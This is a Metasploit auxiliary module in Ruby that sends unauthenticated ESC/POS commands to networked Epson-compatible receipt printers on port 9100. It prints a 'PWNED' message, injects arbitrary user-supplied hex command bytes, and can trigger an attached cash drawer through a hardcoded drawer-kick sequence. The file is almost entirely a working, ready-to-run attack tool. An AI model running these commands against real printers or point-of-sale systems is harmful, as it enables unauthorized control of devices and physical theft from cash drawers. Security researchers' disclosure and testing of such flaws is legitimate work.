# encoding: utf-8
require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'ESC/POS Printer Command Injector',
      'Description' => %q{
        This module demonstrates an unauthenticated ESC/POS command vulnerability in networked Epson-compatible printers (CVE submitted). 
        By default, it prints "PWNED" (or a custom MESSAGE).
        You can also optionally trigger the cash drawer.
      },
      'Author'      => ['FutileSkills'],
      'License'     => MSF_LICENSE
    ))

    register_options(
      [
        Opt::RHOST(),                                      # Target IP
        Opt::RPORT(9100),                                  # Default printer port
        OptString.new('MESSAGE', [true, 'Message to print', 'PWNED']),
        OptString.new('HEX_COMMANDS', [false, 'Custom hex commands to send before printing']),
        OptBool.new('RUN_EXPLOIT', [true, 'Whether to actually send commands to the printer', true]),
        OptBool.new('TRIGGER_DRAWER', [false, 'Whether to trigger the attached cash drawer', false])
      ]
    )
  end

  # Cash drawer command
  DRAWER_COMMAND = "\x1b\x70\x00\x19\x32"

  def run
    rhost_ip = rhost
    message = datastore['MESSAGE']
    hex_commands = datastore['HEX_COMMANDS']
    run_exploit = datastore['RUN_EXPLOIT']
    trigger_drawer = datastore['TRIGGER_DRAWER']

    if run_exploit
      # Send custom hex commands before default sequence
      if hex_commands && !hex_commands.empty?
        begin
          custom_bytes = [hex_commands.gsub(/\\x([0-9A-Fa-f]{2})/, '\1')].pack('H*')
          connect
          sock.put(custom_bytes)
          disconnect
          print_status("Sent custom HEX_COMMANDS to #{rhost_ip}")
        rescue => e
          print_error("Failed to send HEX_COMMANDS: #{e}")
        end
      end

      # ESC/POS print commands: initialize, center, double-size font for message, reset alignment, cut
      print_commands = "\x1b\x40\x1b\x61\x01\x1d\x21\x11#{message}\x1d\x21\x00\n\x1b\x61\x00\n\n\x1d\x56\x42"

      begin
        print_status("Sending print message to #{rhost_ip}...")
        connect
        sock.put(print_commands)
        disconnect

        # Optionally trigger the drawer
        if trigger_drawer
          sleep(1)
          connect
          sock.put(DRAWER_COMMAND)
          disconnect
          print_status("Triggered cash drawer on #{rhost_ip}")
        end

        print_good("Finished sending commands to #{rhost_ip}")
      rescue ::Rex::ConnectionError
        print_error("Failed to connect to #{rhost_ip}")
      end
    else
      print_status("RUN_EXPLOIT is false; skipping sending commands to #{rhost_ip}")
    end
  end
end
